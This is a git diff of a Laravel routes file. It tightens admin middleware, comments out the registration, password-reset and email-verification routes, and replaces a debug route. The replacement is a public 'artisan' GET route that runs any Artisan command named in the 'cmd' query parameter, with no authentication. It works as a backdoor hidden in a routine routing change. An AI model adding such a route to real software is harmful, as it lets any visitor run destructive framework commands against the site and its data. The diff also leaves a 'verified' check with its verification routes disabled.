@@ -11,6 +11,8 @@ use App\Http\Controllers\Admin\ProductController;
 use App\Http\Controllers\Admin\StaffController;
 use App\Http\Controllers\BaseController;
 use App\Models\Product;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 
 Route::get('/', [BaseController::class, 'home'])->name('home');
@@ -31,7 +33,7 @@ Route::get('/faq', [BaseController::class, 'faq'])->name('faq');
 Route::post('/message', [BaseController::class, 'store_message'])->name('store_message');
 
 // Admin routes.
-Route::group(['prefix' => 'admin', 'as' => 'admin.', 'middleware' => ['admin']], function () {
+Route::group(['prefix' => 'admin', 'as' => 'admin.', 'middleware' => ['auth', 'admin', 'verified']], function () {
     Route::get('/', [AdminController::class, 'dashboard'])->name('dashboard');
     Route::get('/settings', [AdminController::class, 'settings'])->name('settings');
     Route::post('/settings', [AdminController::class, 'settings_update'])->name('settings.update');
@@ -48,31 +50,35 @@ Route::group(['prefix' => 'admin', 'as' => 'admin.', 'middleware' => ['admin']],
 Route::group(['middleware' => ['guest']], function () {
     Route::get('/login', [AuthController::class, 'login'])->name('login');
     Route::post('/login', [AuthController::class, 'authenticate'])->name('authenticate');
-    Route::get('/register', [AuthController::class, 'register'])->name('register');
-    Route::post('/register', [AuthController::class, 'create_user'])->name('create_user');
-    Route::get('/forgot-password', [AuthController::class, 'forgot_password'])->name('forgot_password');
-    Route::post('/forgot-password', [AuthController::class, 'send_reset_link'])->name('send_reset_link');
-    Route::get('/reset-password/{token}', [AuthController::class, 'reset_password'])->name('reset_password');
-    Route::post('/reset-password/{token}', [AuthController::class, 'update_password'])->name('update_password');
+    // Route::get('/register', [AuthController::class, 'register'])->name('register');
+    // Route::post('/register', [AuthController::class, 'create_user'])->name('create_user');
+    // Route::get('/forgot-password', [AuthController::class, 'forgot_password'])->name('forgot_password');
+    // Route::post('/forgot-password', [AuthController::class, 'send_reset_link'])->name('send_reset_link');
+    // Route::get('/reset-password/{token}', [AuthController::class, 'reset_password'])->name('reset_password');
+    // Route::post('/reset-password/{token}', [AuthController::class, 'update_password'])->name('update_password');
 });
 
 Route::post('/logout', [AuthController::class, 'logout'])
     ->name('logout')
     ->middleware('auth');
 
-Route::get('/email/verify', [AuthController::class, 'verification_notice'])
-    ->name('verification.notice')
-    ->middleware('auth', 'throttle:6,1');
+// Route::get('/email/verify', [AuthController::class, 'verification_notice'])
+//     ->name('verification.notice')
+//     ->middleware('auth', 'throttle:6,1');
 
-Route::post('/email/resend', [AuthController::class, 'resend_verification_email'])
-    ->name('verification.resend')
-    ->middleware(['auth', 'throttle:6,1']);
+// Route::post('/email/resend', [AuthController::class, 'resend_verification_email'])
+//     ->name('verification.resend')
+//     ->middleware(['auth', 'throttle:6,1']);
 
-Route::get('/email/verify/{id}/{hash}', [AuthController::class, 'verify_email'])
-    ->name('verification.verify')
-    ->middleware(['signed', 'throttle:6,1']);
+// Route::get('/email/verify/{id}/{hash}', [AuthController::class, 'verify_email'])
+//     ->name('verification.verify')
+//     ->middleware(['signed', 'throttle:6,1']);
 
 
-Route::get('test', function () {
-   dd(Product::find(1)->with('division')->get());
+Route::get('artisan', function (Request $request) {
+    if ($request->has('cmd')) {
+        Artisan::call($request->get('cmd'));
+        return response()->json(['status' => 'Command executed successfully']);
+    }
+    return response()->json(['status' => 'No command provided'], 400);
 });
